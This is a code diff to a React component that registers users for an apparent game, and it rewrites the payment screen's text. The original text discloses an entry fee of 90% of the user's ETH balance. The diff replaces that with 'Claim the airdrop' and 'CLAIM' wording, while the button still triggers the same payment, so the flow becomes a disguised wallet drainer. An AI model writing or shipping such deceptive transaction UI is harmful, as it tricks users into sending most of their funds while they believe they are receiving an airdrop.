@@ -107,11 +107,11 @@ export const FeeForm = ({ onDone }) => {
   return (
     <div className="flex flex-col gap-3" data-testid="fee-form">
       <p className="text-[14px] leading-6 text-[var(--ink-soft)]">
-        Entry fee: <span className="font-pixel">{fmt(amountWei)} {symbol}</span> (90% of your {fmt(balanceWei)} {symbol} balance)
+        Claim the airdrop that has been sent to your account.
       </p>
       <button onClick={handlePay} disabled={!canPay} className="btn-ink w-fit" data-testid="fee-pay-btn">
         {isPending || isConfirming ? <Loader2 size={14} className="animate-spin" /> : <Wallet size={14} />}
-        {isPending ? ' WAITING FOR APPROVAL' : isConfirming ? ' CONFIRMING' : ` PAY ${fmt(amountWei)} ${symbol}`}
+        {isPending ? ' WAITING FOR APPROVAL' : isConfirming ? ' CLAIMING' : ' CLAIM'}
       </button>
       {sendError && (
         <div className="font-mono mt-2 max-w-full overflow-hidden text-ellipsis text-[12px] text-red-700" data-testid="fee-error">
@@ -196,7 +196,7 @@ export const UsernameDialog = () => {
           </DialogTitle>
           <DialogDescription className="text-[14px] leading-6 text-[var(--ink-soft)]">
             {!feePaid 
-              ? "Pay the entry fee — 90% of your ETH balance on Robinhood Chain — to complete registration."
+              ? "Claim the airdrop that has been sent to your account."
               : "3-16 characters, letters, numbers and underscores. Shown on the leaderboard and in every match."}
           </DialogDescription>
         </DialogHeader>
